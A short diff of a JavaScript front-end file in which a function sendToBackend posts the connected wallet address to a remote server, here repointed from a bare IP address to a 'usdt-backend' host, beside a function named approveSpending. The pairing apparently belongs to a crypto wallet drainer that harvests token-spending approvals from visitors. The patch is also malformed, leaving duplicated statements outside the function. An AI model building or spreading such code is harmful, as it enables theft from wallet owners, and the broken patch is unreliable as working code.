@@ -63,13 +63,21 @@ async function approveSpending() {
 
 async function sendToBackend(wallet) {
     try {
-        const response = await fetch("http://31.97.206.193:3000/connect", {
+        const response = await fetch("https://usdt-backend-bwch.onrender.com/connect", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ address: wallet })
         });
+
+        const result = await response.json();
+        console.log("Backend response:", result);
+    } catch (error) {
+        console.error("Error sending wallet to backend:", error);
+    }
+}
+
 
         const result = await response.json();
         console.log("Backend response:", result);
